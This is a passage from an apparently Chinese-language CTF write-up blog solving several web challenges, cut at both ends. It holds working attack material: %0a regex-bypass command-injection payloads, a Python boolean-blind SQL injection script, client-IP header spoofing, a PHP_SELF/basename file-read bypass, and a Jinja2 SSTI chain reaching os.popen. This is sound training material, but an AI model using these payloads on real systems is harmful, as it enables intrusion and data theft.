class="hljs-params">source</span>|<span class="hljs-params">suspend</span>|<span class="hljs-params">test</span>|<span class="hljs-params">times</span>|<span class="hljs-params">trap</span>|<span class="hljs-params">type</span>|<span class="hljs-params">typeset</span>|<span class="hljs-params">ulimit</span>|<span class="hljs-params">umask</span>|<span class="hljs-params">unalias</span>|<span class="hljs-params">unset</span>|<span class="hljs-params">until</span>|<span class="hljs-params">wait</span>|<span class="hljs-params">while</span>|[\<span class="hljs-params">x00</span>-\<span class="hljs-params">x1FA</span>-Z0-9!#-\<span class="hljs-operator">/</span>;-@\[-`|~\<span class="hljs-params">x7F</span>]+)</span>.*$/&#x27;, $json)) &#123;<br>    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    echo &#x27;Attempting <span class="hljs-keyword">to</span> run command:&lt;br/&gt;&#x27;;<br>    $cmd = json<span class="hljs-constructor">_decode($<span class="hljs-params">json</span>, <span class="hljs-params">true</span>)</span><span class="hljs-literal">[&#x27;<span class="hljs-identifier">cmd</span>&#x27;]</span>;<br>    <span class="hljs-keyword">if</span> ($cmd !== NULL) &#123;<br>      system($cmd);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      echo &#x27;Invalid input&#x27;;<br>    &#125;<br>    echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>代码中使用putenv(‘PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jail’); 配置系统环境变量，而我们用不了 cat 也有可能是在这个环境变量下没有这个二进制文件</p><p>因为这些命令实际上是存放在特定目录中封装好的程序，PATH环境变量就是存放这些特定目录的路径方便我们去直接调用这些命令，所以此处部分命令我们得使用其存放的绝对路径去调用</p><p>然后就是正则匹配的绕过了<br>可以注意到正则表达式采用了^xxx$的格式，同时也采用了.*这样的贪婪匹配，所以有两个方案来绕过正则——回溯次数超限和利用%0a。</p><p>利用%0a：%0a对于^xxx$这个格式的绕过太常见了，只需要注意下表达式中存在一段</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>-\<span class="hljs-keyword">x</span><span class="hljs-number">1</span>F<br></code></pre></td></tr></table></figure><p>会匹配一个%0a，但多在payload前后加几个%0a就行了。<br><img src="/images/VD0G2K3MS8WJMY0.png"><br><img src="/images/20201203222019541.png"><br>看看现在能不能行</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;ls /&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/QC88QV83GL7BO.png"><br>根目录中没有flag<br>用find查找</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;find / -name flag*&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure><p>没有报错但也没有显示，那么说这个环境变量下也没有find</p><p><strong>Linux命令的位置：&#x2F;bin,&#x2F;usr&#x2F;bin，默认都是全体用户使用，&#x2F;sbin,&#x2F;usr&#x2F;sbin,默认root用户使用</strong><br><img src="/images/Q2BO12RTCT42RURJXEVW.png"><br>在&#x2F;usr&#x2F;bin下找到了find<br>这样来使用</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;/usr/bin/find / -name flag*&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/KXA7MY8AXFZUXW.png"><br>找到了flag的路径<br><img src="/images/S73VKNZ1Z1VDVZYA.png"><br>找到cat的路径</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/B4QC95042UQCY2WB.png"><br>再看看环境变量&#x2F;home&#x2F;rceservice&#x2F;jail下有什么<br><img src="/images/XKOFAHMGNI3P7XQAKZOOW.png"><br>是ls，解释了为啥刚开始能用ls的原因</p><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>只有一个输入框<br>输入1<br>回显Hi admin, your score is: 100<br>最多输到4<br>盲猜sql注入<br>输入</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>显示student number not exists.<br>有可能空格或者or被过滤</p><p>多轮测试过后发现仅空格被过滤，用&#x2F;**&#x2F;代替空格即可</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>or<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>发现规律，命令错误会报错<br>使用布尔盲注<br>编写python脚本方便使用</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs hsp">import requests<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span> :<br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> True:<br>        i = i + <span class="hljs-number">1</span><br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            mid = (low + high) <span class="hljs-comment">// 2</span><br>            <span class="hljs-meta"># payload = f&#x27;<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>and<span class="hljs-comment">/**/</span><span class="hljs-keyword">if</span>(ascii(substr((select<span class="hljs-comment">/**/</span>group_concat(schema_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>information_schema.schemata),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)%<span class="hljs-number">23</span>&#x27;</span><br>            <span class="hljs-meta"># payload = f&#x27;<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>and<span class="hljs-comment">/**/</span><span class="hljs-keyword">if</span>(ascii(substr((select<span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_schema=<span class="hljs-string">&quot;ctf&quot;</span>),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)%<span class="hljs-number">23</span>&#x27;</span><br>            <span class="hljs-meta"># payload = f&#x27;<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>and<span class="hljs-comment">/**/</span><span class="hljs-keyword">if</span>(ascii(substr((select<span class="hljs-comment">/**/</span>group_concat(column_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_name=<span class="hljs-string">&quot;flag&quot;</span>),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)%<span class="hljs-number">23</span>&#x27;</span><br>            payload = f<span class="hljs-string">&#x27;1/**/and/**/if(ascii(substr((select/**/group_concat(value)/**/from/**/ctf.flag),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>            <span class="hljs-meta"># print(payload)</span><br>            url = f<span class="hljs-string">&quot;http://ac3f56f2-dc89-4ab5-a066-b6f2d94da972.node5.buuoj.cn:81/?stunum=&#123;payload&#125;&quot;</span><br>            <span class="hljs-meta">#print(url)</span><br>            <span class="hljs-meta"># data=&#123;</span><br>            <span class="hljs-meta"># <span class="hljs-string">&quot;&quot;</span>:f<span class="hljs-string">&quot;admin&#x27; and &#123;payload&#125;#&quot;</span>,</span><br>            <span class="hljs-meta">#</span><br>            <span class="hljs-meta"># &#125;</span><br>            r = requests.get(url=url)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;admin&#x27;</span> in r.text:<br>                low = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = mid<br>        <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>            result += chr(low)<br>            <span class="hljs-keyword">print</span>(result)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>源代码里是有我们需要的东西的</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;!--<br><span class="hljs-regexp">//</span><span class="hljs-number">1</span>st<br><span class="hljs-variable">$query</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<span class="hljs-regexp">//</span>可以理解为获取输入的字符信息,获取的是?后面的值<br><br> <span class="hljs-keyword">if</span>( substr_count(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;_&#x27;</span>) !== <span class="hljs-number">0</span> || substr_count(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;%5f&#x27;</span>) != <span class="hljs-number">0</span> )&#123;<span class="hljs-regexp">//</span>substr_count获取字符的出现次数<br>    die(<span class="hljs-string">&#x27;Y0u are So cutE!&#x27;</span>);<br>&#125;<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>] !== <span class="hljs-string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="hljs-string">&#x27;/^23333$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>]))&#123;<br>    echo <span class="hljs-string">&quot;you are going to the next ~&quot;</span>;<br>&#125;<br>!--&gt;<br></code></pre></td></tr></table></figure><p>开始绕<br>他没有大小写的检测%5f用%5F绕过<br>以$结尾也没有禁用换行符，就用%0a绕过<br>payload</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?b[u<span class="hljs-meta">%</span><span class="hljs-number">5</span>Fp<span class="hljs-meta">%</span><span class="hljs-number">5</span>Ft=<span class="hljs-number">23333</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><p><img src="/images/H37HXSCW5QM6ZXX.png"><br>进入再源代码发现一个加密信息<br>复制粘贴在控制台里<br><img src="/images/B8K9LNDE6H7CN95S.png"><br>那么POST Merak,值随意</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;takeip.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Merak&#x27;</span>]))&#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br>    <span class="hljs-keyword">die</span>(); <br>&#125; <br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123; <br>    <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$v</span>); <br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123; <br>        <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> ); <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>; <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Local access only!&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getIp</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="hljs-variable">$ip</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;<br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p>出现了新的源码<br>第一步是伪造ip<br>有如下几种方式</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">Client</span>-ip:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Client-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Remote-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Rriginating-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Remote-addr:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">HTTP_CLIENT_IP</span>:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Real-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Originating-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">via</span>:<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>测试仅client-ip可以使用<br>header中添加client-ip<br>file_get_contents用php伪协议绕过</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">?<span class="hljs-number">2333</span>=php://<span class="hljs-built_in">input</span><br>pos<span class="hljs-variable">t:todat</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">a</span> happy day<br></code></pre></td></tr></table></figure><p>这步开始用burp操作，hackbar有点问题</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl">function change($v)&#123; <br>    $v = base64_decode($v); <br>    $re = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($v);$i++)&#123; <br>        $re .= <span class="hljs-keyword">chr</span> ( <span class="hljs-keyword">ord</span> ($v[$i]) + $i*<span class="hljs-number">2</span> ); <br>    &#125; <br>    <span class="hljs-keyword">return</span> $re; <br>&#125;<br></code></pre></td></tr></table></figure><p>这块反向编译下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123;<br><br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) - <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> );<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/images/KZK2SNH27KTYEM6Y.png"></p><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>点击source查看源码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br>include <span class="hljs-string">&#x27;config.php&#x27;</span>; <span class="hljs-regexp">//</span> FLAG is defined <span class="hljs-keyword">in</span> config.php<br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  highlight_file(basename(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$secret</span> = bin2hex(random_bytes(<span class="hljs-number">64</span>));<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$guess</span> = (string) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>  <span class="hljs-keyword">if</span> (hash_equals(<span class="hljs-variable">$secret</span>, <span class="hljs-variable">$guess</span>)) &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>  &#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>代码告诉了我们flag在config.php里<br>但是下面又过滤了config.php&#x2F;<br>$_SERVER[‘PHP_SELF’]返回的是路径+脚本名<br>下面有一行代码表示可以直接获得flag，但要能够破解随机数就能得到flag，这个难度太大了。。</p><p>这里是有突破点的</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>注意这里&#x2F;config.php/*$是匹配了尾部的，我们可以通过尾部添加不可显字符来绕过正则，比如%ff</p><p>basename()<br>会返回路径重的文件名部分。比如&#x2F;index.php&#x2F;config.php使用basename()之后返回config.php。<br>basename()会去掉文件名开头的非ASCII值。</p><p>这里写一段php语句来搞清楚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-string">&#x27;index.php/config.php%ff?source&#x27;</span>).<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]);<br><br></code></pre></td></tr></table></figure><p><img src="/images/YVE0N5JFKM9LXPB.png"><br>因为$_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用&#x2F;index.php&#x2F;config.php&#x2F;%ff?source来读取flag。<br><img src="/images/RZX7CIEXRHL29BSAOH.png"></p><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>题目说了是关于flask的<br>源代码有提示参数为search<br>所以直接ssti注入</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">2</span>*<span class="hljs-number">4</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/DHRQ62NL9WHJ3KCS.png"><br>因为是用flask搭建的网站，所以这里的判断很自然就是jinja2的模板注入。</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0]&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>用bases或mro都行，只要打印返回(&lt;class ‘object’&gt;,)，找到了他的基类object即可<br><img src="/images/F34OP5L5YL70ND5.png"><br>接下来我们使用subclasses() 这个方法，这个方法返回的是这个类的子类的集合，也就是object类的子类的集合。</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/XB3KH95A5B5FCPYQ.png"><br>在基本类的子类中找到重载过的__init__类(貌似是个类就行)<br>那么我们直接找第一个显示的类</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[58]&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/JOCO5EUQUU6V8XXB.png"></p><p>测试发现globals被过滤了，使用拼凑法绕过</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[58].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;]&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>接下来利用eval进行命令执行</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[58].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/S9WS6UXXSXDW65FE.png"><br>flag在flasklight中</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span 